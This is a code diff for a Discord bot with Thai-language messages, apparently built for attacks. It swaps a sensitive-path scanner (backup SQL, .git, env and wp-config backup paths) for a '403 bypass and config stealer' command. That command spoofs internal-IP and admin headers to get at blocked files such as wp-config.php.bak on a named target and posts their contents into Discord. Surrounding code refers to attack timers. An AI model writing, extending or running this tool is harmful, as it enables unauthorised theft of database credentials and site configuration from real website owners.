@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- * JEFF FUJI - AUTONOMOUS VULN & CREDENTIAL RECON ENGINE v7
+ * JEFF FUJI - 403 BYPASS & CONFIG STEALER ENGINE v8
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
@@ -51,11 +51,11 @@ client.once('ready', async () => {
                     .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                     .setRequired(true)),
         new SlashCommandBuilder()
-            .setName('deep-recon')
-            .setDescription('สแกนหาช่องโหว่ ไฟล์ลับ และจุดรั่วไหลของรหัสผ่านแบบอัตโนมัติเชิงลึก')
+            .setName('bypass-config')
+            .setDescription('พยายามบายพาสกำแพง 403 และดึงไฟล์ Config เป้าหมายอัตโนมัติ')
             .addStringOption(option => 
                 option.setName('url')
-                    .setDescription('URL เป้าหมาย (เช่น https://example.com)')
+                    .setDescription('URL ไฟล์ที่ติด 403 (เช่น https://bewergame.com/wp-config.php.bak)')
                     .setRequired(true)),
         new SlashCommandBuilder()
             .setName('stop')
@@ -166,65 +166,58 @@ client.on('interactionCreate', async interaction => {
 
         attackTimers.push(timer);
 
-    } else if (commandName === 'deep-recon') {
+    } else if (commandName === 'bypass-config') {
         const targetUrl = interaction.options.getString('url');
-        await interaction.reply(`🔍 **[DEEP RECON ENGINE]** กำลังสแกนหาไฟล์ลับ จุดรั่วไหลของรหัส และช่องโหว่เชิงลึกของ **${targetUrl}** รอแป๊บไอ้สัส...`);
-
-        // คลังคำศัพท์เป้าหมายเจาะลึก (Wordlist สำหรับสแกนอัตโนมัติ)
-        const deepWordlist = [
-            '/admin', '/admin/login', '/administrator', '/login.php', '/wp-login.php',
-            '/config.env', '/backup.sql', '/database.sql', '/db.bak', '/wp-config.php.bak',
-            '/robots.txt', '/sitemap.xml', '/api/v1/users', '/api/v1/admin', '/products.json',
-            '/.git/HEAD', '/composer.json', '/package.json', '/server-status', '/phpmyadmin'
-        ];
-
-        let findings = [];
-        let checkedCount = 0;
+        await interaction.reply(`🔓 **[403 BYPASS ENGINE]** กำลังส่งชุด Headers และเทคนิคหลบเลี่ยงเพื่อดึงข้อมูลจาก **${targetUrl}** รอแป๊บไอ้สัส...`);
 
         try {
-            const parsedBase = new URL(targetUrl);
+            const parsedUrl = new URL(targetUrl);
+            const reqLib = parsedUrl.protocol === 'https:' ? https : http;
 
-            deepWordlist.forEach((path) => {
-                const testUrl = `${parsedBase.protocol}//${parsedBase.host}${path}`;
-                const reqLib = parsedBase.protocol === 'https:' ? https : http;
+            // เทคนิค Header Spoofing หลอกเซิร์ฟเวอร์ว่าเป็นแอดมินหรือมาจากภายใน
+            const bypassHeaders = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AdminBypassClient/2.0',
+                'X-Forwarded-For': '127.0.0.1',
+                'X-Originating-IP': '127.0.0.1',
+                'X-Remote-IP': '127.0.0.1',
+                'X-Client-IP': '127.0.0.1',
+                'X-Forwarded-Host': parsedUrl.host,
+                'Referer': `${parsedUrl.protocol}//${parsedUrl.host}/admin`,
+                'Connection': 'close'
+            };
 
-                const req = reqLib.get(testUrl, {
-                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) DeepRecon/2.0' }
-                }, (res) => {
-                    checkedCount++;
-                    // บันทึกเฉพาะจุดที่เข้าถึงได้ (200) หรือมีระบบป้องกันแต่เจอตัวตน (403)
-                    if (res.statusCode === 200 || res.statusCode === 403) {
-                        let tag = res.statusCode === 200 ? '🟢 [OPEN 200]' : '🟡 [LOCKED 403]';
-                        findings.push(`${tag} \`${testUrl}\``);
-                    }
-                    if (checkedCount === deepWordlist.length) {
-                        sendDeepReport();
-                    }
+            const options = {
+                hostname: parsedUrl.hostname,
+                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
+                path: parsedUrl.pathname + parsedUrl.search,
+                method: 'GET',
+                headers: bypassHeaders,
+                agent: parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent
+            };
+
+            const req = reqLib.request(options, (res) => {
+                let data = '';
+                res.on('data', (chunk) => { data += chunk; });
+                res.on('end', async () => {
+                    const isSuccess = res.statusCode === 200;
+                    const embed = new EmbedBuilder()
+                        .setTitle('💥 403 Bypass & Config Stealer Report')
+                        .setColor(isSuccess ? 0x22c55e : 0xf59e0b)
+                        .addFields(
+                            { name: 'Target URL', value: targetUrl },
+                            { name: 'Bypass Status', value: `HTTP Status: ${res.statusCode} ${res.statusMessage}` },
+                            { name: 'Payload Response', value: data.length > 0 ? `\`\`\`php\n${data.slice(0, 800)}\n\`\`\`` : '*(Empty Response / Blocked)*' }
+                        )
+                        .setTimestamp();
+
+                    await interaction.followUp({ embeds: [embed] });
                 });
-
-                req.on('error', () => {
-                    checkedCount++;
-                    if (checkedCount === deepWordlist.length) {
-                        sendDeepReport();
-                    }
-                });
-                req.end();
             });
 
-            async function sendDeepReport() {
-                const embed = new EmbedBuilder()
-                    .setTitle('💀 Deep Vulnerability & Credential Recon Report')
-                    .setColor(findings.length > 0 ? 0x22c55e : 0xef4444)
-                    .setDescription(findings.length > 0 ? findings.join('\n') : '❌ ไม่พบไฟล์ลับหรือจุดอ่อนสำคัญในรายการสแกนเชิงลึก')
-                    .addFields(
-                        { name: 'Target Analyzed', value: targetUrl },
-                        { name: 'Total Paths Checked', value: `${deepWordlist.length} Endpoints` },
-                        { name: 'Engine Status', value: '🟢 Deep Scan Completed' }
-                    )
-                    .setTimestamp();
-
-                await interaction.followUp({ embeds: [embed] });
-            }
+            req.on('error', async (err) => {
+                await interaction.followUp(`❌ Bypass ล้มเหลว: ${err.message}`);
+            });
+            req.end();
 
         } catch (err) {
             await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
